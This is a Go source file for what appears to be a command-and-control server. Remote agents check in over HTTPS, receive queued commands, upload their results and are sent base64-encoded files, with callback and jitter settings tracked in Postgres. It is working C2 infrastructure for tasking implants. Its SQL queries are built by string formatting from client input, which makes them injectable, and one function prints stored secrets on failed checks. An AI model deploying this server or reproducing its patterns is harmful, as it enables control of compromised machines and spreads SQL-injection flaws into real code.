package main

import (
	"bufio"
	"crypto/tls"
	"database/sql"
	b64 "encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	_ "github.com/lib/pq"
	"golang.org/x/net/http2"
	"gopkg.in/yaml.v2"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

// Database connection
var db *sql.DB

// Configuration file
var cfg Config

// Configuration file struct
type Config struct {
	Server struct {
		Ip	 		string `yaml:"ip"`
		Port 		string `yaml:"port"`
		Uri 		string `yaml:"uri"`
		Secret 		string `yaml:"secret"`
		Cert 		string `yaml:"cert"`
		Key 		string `yaml:"key"`
		In          string `yaml:"in"`
		Out         string `yaml:"out"`
	} `yaml:"server"`
	Database struct {
		Dbhost string `yaml:"host"`
		Dbport int	  `yaml:"port"`
		Dbuser string `yaml:"user"`
		Dbpass string `yaml:"pass"`
		Dbname string `yaml:"name"`
		Dbmode string `yaml:"mode"`
	} `yaml:"database"`
}

// Agent task object
type AgentIdentity struct {
	Id 		int 	`db:"id"`
	Name 		string 	`db:"name"`
	Architecture 	string 	`db:"architecture"`
	Os 		string 	`db:"os"`
	Secret          string  `db:"secret"`
	Callback        int	`db:"callback"`
	Jitter          int   	`db:"jitter"`
	FirstSeen 	int64 	`db:"firstSeen"`
	LastSeen 	int64 	`db:"lastSeen"`
}

// Agent task object
type AgentTask struct {
	Id 		int 	`db:"id"`
	Name 		string 	`db:"name"`
	Job             int     `db:"job"`
	Command 	string 	`db:"command"`
	Status 		string 	`db:"status"`
	TaskDate 	int64 	`db:"taskDate"`
	CompleteDate 	int64 	`db:"completeDate"`
	Complete 	bool 	`db:"complete"`
}

// Validate agent token struct
type AgentToken struct {
	Name 	string `db:"name"`
	Secret 	string `db:"secret"`
	Token  	string `db:"token"`
}

// Agent
type Agent struct {
	Name 	string `json:"name"`
	Secret 	string `json:"secret"`
	Job     string `json:"job"`
	Results	[]Result
}

// Agent struct for posting results
type Result struct {
	Name   string `json:"name"`
	JobId  int    `json:"jobId"`
	Output string `json:"output"`
}

// Agent struct for tasks
type Task struct {
	Id 	int 	`json:"id"`
	Command string 	`json:"command"`
}

type TaskList struct {
	AgentTasking []Task
}

func main() {
	// Required: server and database configuration file
	var config = flag.String("c", "config.yml", "Configuration file")
	flag.Parse()

	// Parse the configuration file
	initServer(*config)

	// Start the server
	StartServer(cfg.Server.Ip, cfg.Server.Port, cfg.Server.Uri)
}

func initServer(c string) {

	// Read server configuration
	f, err := os.Open(c)
	if err != nil {
		fmt.Println("[!] Missing configuration file.")
		os.Exit(3)
	}
	defer f.Close()

	decoder := yaml.NewDecoder(f)
	err = decoder.Decode(&cfg)
	if err != nil {
		fmt.Println("[!] Error reading configuration file.")
		os.Exit(3)
	}

	// Connect to database
	connect()

	// Create db schema if not exist
	CreateSchemas()

	// Get working path and make directories
	working := getWorkingDirectory()
	makeDirectories(working)
}

func StartServer(ip string, port string, uri string) {

	mux := http.NewServeMux()
	mux.HandleFunc(uri, taskHandler)

	// TLS server configuration
	s := fmt.Sprintf("%s:%s", ip, port)
	server := &http.Server{
		Addr: s,
		Handler: mux,
		ReadTimeout: 10 * time.Second,
		WriteTimeout: 10 * time.Second,
		TLSConfig: tlsConfig(),
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
	}

	// Configure TLS server
	var http2Server = http2.Server{}
	if err := http2.ConfigureServer(server, &http2Server); err != nil {
		processError(err)
	}

	d := fmt.Sprintf("[+] Go Backend: { HTTPVersion = 2 }\n[+] Server started")
	log.Print(d)

	// Start TLS Server
	if err := server.ListenAndServeTLS("", ""); err != nil {
		processError(err)
	}
}

func taskHandler(w http.ResponseWriter, req *http.Request) {

	if req.Method != "POST" {
		http.Error(w, "page not found", 404)
		return
	}

	// Instantiate agent
	var a Agent

	// Parse JSON client body
	decoder := json.NewDecoder(req.Body)
	err := decoder.Decode(&a)
	if err != nil {
		http.Error(w, "page not found", 404)
		return
	}

	aExists := agentExist(a.Name)
	if aExists {
		x := GetAgent(a.Name)

		if x.Secret != a.Secret {
			http.Error(w, "page not found", 404)
			return
		}

		if a.Job == "reboot" || a.Job == "heartbeat" {
			if a.Job == "reboot" {
				err := AddRebootTask(a.Name)
				if err != nil {
					http.Error(w, err.Error(), 404)
					return
				}
				fmt.Println("[*] Reboot settings requested from ", a.Name)
			} else {
				fmt.Println("[*] Observed heartbeat from", a.Name)
			}

			// Update the agent check in time
			UpdateAgentStatus(a.Name)

			// Query agent tasks based on name
			t := TaskList{}
			err := GetAgentJobs(a.Name, &t)
			if err != nil {
				http.Error(w, err.Error(), 404)
				return
			}

			// Check for tasks, if none return 404
			if len(t.AgentTasking) < 1 {
				http.Error(w, "page not found", 404)
				return
			}

			// Tasks to json
			out, err := json.Marshal(t)
			if err != nil {
				http.Error(w, err.Error(), 500)
				return
			}

			_,_ = fmt.Fprint(w, string(out))
		} else if a.Job == "post" {
			if len(a.Results) > 0 {
				fmt.Println("[*] Receiving data from", a.Name)
			}
			for i := 0; i < len(a.Results); i++ {
				UpdateAgentJobs(a.Results[i].JobId, strings.TrimSpace(a.Results[i].Output), a.Name)
			}
		} else {
			http.Error(w, "page not found", 404)
			return
		}
	} else if a.Name != "" && a.Secret != "" && a.Job != "" {
		if a.Job == "heartbeat" {
			token := generateRandomString()
			cmd := fmt.Sprintf("update %s", token)
			AddToken(a.Name, a.Secret, token)

			// Create a single task
			tList := TaskList{}
			t := Task{}
			t.Id = 0
			t.Command = cmd
			tList.AgentTasking = append(tList.AgentTasking, t)

			// Create JSON task
			out, err := json.Marshal(tList)

			if err != nil {
				http.Error(w, err.Error(), 500)
				return
			}

			fmt.Println("[+] New agent check in from", a.Name)

			_,_ = fmt.Fprint(w, string(out))
		} else if a.Job == "update" {

			//t := b64Decode(strings.TrimSpace(a.Results[0].Output))
			t := strings.TrimSpace(a.Results[0].Output)
			c := strings.Split(t, ",")
			x := GetToken(a.Name, a.Secret, strings.TrimSpace(c[0]))

			if x {
				// Add the new agent to the db
				w, _ := strconv.Atoi(strings.TrimSpace(c[5]))
				z, _ := strconv.Atoi(strings.TrimSpace(c[6]))
				AddNewAgent(strings.TrimSpace(c[1]), strings.TrimSpace(c[2]), strings.TrimSpace(c[3]),
					strings.TrimSpace(c[4]), w, z)

				fmt.Println("[+] New agent heartbeat from", a.Name)
			} else {
				http.Error(w, "page not found", 404)
				return
			}
		} else {
			http.Error(w, "page not found", 404)
			return
		}
	} else {
		http.Error(w, "page not found", 404)
		return
	}
}

// Error function
func processError(err error) {
	fmt.Println(err)
	os.Exit(2)
}

func b64Encode(s string) string {
	return b64.StdEncoding.EncodeToString([]byte(s))
}

func b64Decode(s string) string {
	x,_ := b64.StdEncoding.DecodeString(s)
	return string(x)
}

func generateRandomString() string {
	rand.Seed(time.Now().UnixNano())
	chars := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
	length := 12
	var b strings.Builder
	for i := 0; i < length; i++ {
		b.WriteRune(chars[rand.Intn(len(chars))])
	}
	return b.String()
}

func CreateDirIfNotExist(dir string) {
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		err = os.MkdirAll(dir, 0755)
		if err != nil {
			processError(err)
		}
	}
}

func getWorkingDirectory() string {
	// Get working directory
	path, err := os.Getwd()
	if err != nil {
		processError(err)
	}
	return path
}

func makeDirectories(path string) {
	// Create inbox and outbox paths
	outPath := fmt.Sprintf("%s/%s", path, cfg.Server.In)
	inPath := fmt.Sprintf("%s/%s", path, cfg.Server.Out)
	CreateDirIfNotExist(outPath)
	CreateDirIfNotExist(inPath)
}

// Server TLS Configuration
func tlsConfig() *tls.Config {

	crt, err := ioutil.ReadFile(cfg.Server.Cert)
	if err != nil {
		processError(err)
	}

	key, err := ioutil.ReadFile(cfg.Server.Key)
	if err != nil {
		processError(err)
	}

	cert, err := tls.X509KeyPair(crt, key)
	if err != nil {
		processError(err)
	}

	return &tls.Config{
		MinVersion:               tls.VersionTLS12,
		CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		},
		Certificates: []tls.Certificate{cert},
		ServerName:   "localhost",
	}
}

// Connect to postgres database
func connect() {
	connectionString := fmt.Sprintf("host=%s port=%d user=%s password=%s dbname=%s sslmode=%s",
		cfg.Database.Dbhost, cfg.Database.Dbport, cfg.Database.Dbuser, cfg.Database.Dbpass, cfg.Database.Dbname,
		cfg.Database.Dbmode)

	var err error
	db, err = sql.Open("postgres", connectionString)
	if err != nil {
		processError(err)
	}

	err = db.Ping()
	if err != nil {
		processError(err)
	}
}

// Execute postgres commands
func exec(command string) {
	_, err := db.Exec(command)
	if err != nil {
		processError(err)
	}
}

// Get current epoch time
func GetCurrentEpoch() int64 {
	return time.Now().Unix()
}

func readFile(s string) string {
	if _, err := os.Stat(s); err == nil {
		f, err := os.Open(s)
		if err != nil {
			return b64Encode(err.Error())
		} else {
			reader := bufio.NewReader(f)
			content, _ := ioutil.ReadAll(reader)
			return b64.StdEncoding.EncodeToString(content)
		}
	} else {
		return "Error"
	}
}

// Add agent to Postgres
func AddNewAgent(a string, s string, ar string, o string, c int, j int) {
	t := "INSERT INTO agents (name,architecture,os,secret,callback,jitter,firstSeen,lastSeen) VALUES ('%s', '%s', '%s', '%s', %d, %d, %d, %d)"
	command := fmt.Sprintf(t, a, ar, o, s, c, j, GetCurrentEpoch(), GetCurrentEpoch())
	exec(command)
	fmt.Printf("[+] New agent checked in: %s", a)
}

// Get agent tasks
func GetAgentJobs(n string, tList *TaskList) error {
	q := "SELECT job,command FROM tasks WHERE name='%s' AND complete=false AND status='Deployed' ORDER BY taskDate ASC"
	command := fmt.Sprintf(q, n)
	rows, err := db.Query(command)

	if err != nil {
		processError(err)
	}

	defer rows.Close()
	for rows.Next() {
		t := Task{}
		err = rows.Scan(&t.Id, &t.Command)
		if err != nil {
			return err
		}
		c := strings.Split(t.Command, " ")
		if c[0] == "push" {
			x := fmt.Sprintf("%s %s %s", c[0], readFile(c[1]), c[2])
			t.Command = x
		}
		UpdateAgentJobStatus(t.Id)
		tList.AgentTasking = append(tList.AgentTasking, t)
	}

	err = rows.Err()
	if err != nil {
		return err
	}
	return nil
}

// Get agent tasks
func AddRebootTask(n string) error {
	q := "SELECT callback,jitter FROM agents WHERE name='%s' LIMIT 1"
	command := fmt.Sprintf(q, n)
	row := db.QueryRow(command)

	j := []string{"callback", "jitter"}

	var a AgentIdentity
	switch err := row.Scan(&a.Callback, &a.Jitter); err  {
	case sql.ErrNoRows:
		return err
	case nil:
		for _, s := range j {
			at := AgentTask{}
			at.Name = n
			at.Status = "Deployed"
			at.TaskDate = GetCurrentEpoch()
			at.CompleteDate = 0
			at.Complete = false

			if s == "callback" {
				// Make command string
				x := fmt.Sprintf("set callback %d", a.Callback)
				at.Command = x
			} else {
				x := fmt.Sprintf("set jitter %d", a.Jitter)
				at.Command = x
			}
			AddAgentTask(at)
		}
		return  nil
	default:
		return err
	}
}

// Add task to Postgres
func AddAgentTask(a AgentTask) {
	t := "INSERT INTO tasks (name, command, status, taskDate, completeDate, complete) VALUES ('%s', '%s', '%s', %d, %d, %t);"
	command := fmt.Sprintf(t, a.Name, a.Command, a.Status, a.TaskDate, a.CompleteDate, a.Complete)
	exec(command)
}

func agentExist(n string) bool {
	q := "SELECT id,name,secret FROM agents WHERE name='%s'"
	command := fmt.Sprintf(q, n)
	row := db.QueryRow(command)

	var a AgentIdentity
	switch err := row.Scan(&a.Id, &a.Name, &a.Secret); err  {
	case sql.ErrNoRows:
		return false
	case nil:
		return true
	default:
		return false
	}
}

func GetAgent(n string) AgentIdentity {
	q := "SELECT id,name,secret FROM agents WHERE name='%s'"
	command := fmt.Sprintf(q, n)
	row := db.QueryRow(command)

	var a AgentIdentity
	switch err := row.Scan(&a.Id, &a.Name, &a.Secret); err  {
	case sql.ErrNoRows:
		a.Secret = ""
		return a
	case nil:
		return a
	default:
		a.Secret = ""
		return a
	}
}

func UpdateAgentStatus(n string) {
	u := "UPDATE agents SET lastSeen = %d WHERE name = '%s'"
	c := fmt.Sprintf(u, GetCurrentEpoch(), n)
	exec(c)
}

func UpdateAgentJobStatus(i int) {
	u := "UPDATE tasks SET status = 'Sent' WHERE job = %d"
	c := fmt.Sprintf(u, i)
	exec(c)
}

// Get agent tasks
func UpdateAgentJobs(i int, s string, n string) {
	u := "UPDATE tasks SET status = 'Complete', completeDate = %d, complete = true WHERE job = %d"
	c1 := fmt.Sprintf(u,GetCurrentEpoch(),i)
	exec(c1)

	j := "INSERT INTO results (name,jobId,output,completeDate) VALUES ('%s', %d, '%s', %d)"
	c2 := fmt.Sprintf(j, n, i, s, GetCurrentEpoch())
	exec(c2)
}

// Add Agent token
func AddToken(n string, s string, t string) {
	u := "INSERT INTO tokens (name,secret,token) VALUES ('%s','%s','%s')"
	c := fmt.Sprintf(u, n, s, t)
	exec(c)
}

// Add Agent token
func GetToken(n string, s string, t string) bool {
	q := "SELECT name,secret,token FROM tokens WHERE name='%s'"
	command := fmt.Sprintf(q, n)
	row := db.QueryRow(command)

	var a AgentToken
	switch err := row.Scan(&a.Name, &a.Secret, &a.Token); err  {
	case sql.ErrNoRows:
		return false
	case nil:
		if s == a.Secret && t == a.Token {
			return true
		} else {
			fmt.Println(a.Secret)
			return false
		}
	default:
		return false
	}
}

// Create schemas
func CreateSchemas() {
	createAgentSchema()
	createTaskSchema()
	createResultSchema()
	createTokenSchema()
}

// Create Postgres database schema for agents
func createAgentSchema() {
	agentSchema := `
        CREATE TABLE IF NOT EXISTS agents (
          id SERIAL PRIMARY KEY,
          name TEXT UNIQUE,
          architecture TEXT,
          os TEXT,
          secret TEXT,
          callback INTEGER,
          jitter INTEGER,
          firstSeen INTEGER,
          lastSeen INTEGER
        );
    `
	exec(agentSchema)
}

// Create Postgres database schema for tasks
func createTaskSchema() {
	taskSchema := `
        CREATE TABLE IF NOT EXISTS tasks (
          id SERIAL PRIMARY KEY,
          name TEXT,
   	      job SERIAL UNIQUE,
          command TEXT,
          status TEXT,
          taskDate INTEGER,
          completeDate INTEGER,
          complete BOOLEAN
        );
    `
	exec(taskSchema)
}

// Create Postgres database schema for results
func createResultSchema() {
	resultSchema := `
        CREATE TABLE IF NOT EXISTS results (
          id SERIAL PRIMARY KEY,
          name TEXT,
          jobId INTEGER,
          output TEXT,
          completeDate INTEGER
        );
    `
	exec(resultSchema)
}

// Create Postgres database schema for results
func createTokenSchema() {
	tokenSchema := `
        CREATE TABLE IF NOT EXISTS tokens (
          id SERIAL PRIMARY KEY,
          name TEXT UNIQUE,
          secret TEXT,
          token TEXT
        );
    `
	exec(tokenSchema)
}
